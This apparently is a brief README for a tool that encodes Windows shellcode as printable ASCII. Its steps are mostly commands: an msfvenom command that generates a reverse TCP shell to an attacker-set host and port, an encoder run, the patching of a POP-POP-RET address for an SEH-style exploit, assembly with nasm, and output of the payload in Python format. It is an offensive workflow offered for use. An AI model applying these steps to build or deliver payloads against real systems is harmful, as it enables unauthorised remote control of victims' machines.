# Generate an printable ASCII shellcode

## Utilization

### Step 1 - Generate your payload
```
msfvenom -p windows/shell_reverse_tcp lhost=XXX.XXX.XXX.XXX lport=XXXX -a x86 --platform win -f raw -o /tmp/reverse_shell.o
```

### Step 2 - Generate the decoder.asm
```
./encoder.py -p /tmp/reverse_shell.o
```

### Step 3 - Replace PLACEHOLDER with POP; POP; RET
Find one POP; POP; RET address inside your application and open the file payload.asm changing the 0x41414141 PLACEHOLDER address to this address


### Step 4 - Assembly all ASM
```
nasm payload.asm -o payload.o
```

### Step 5 - Show the result as python format
```
cat payload.o | msfvenom -p - -a x64 --platform win -e generic/none -f python
```
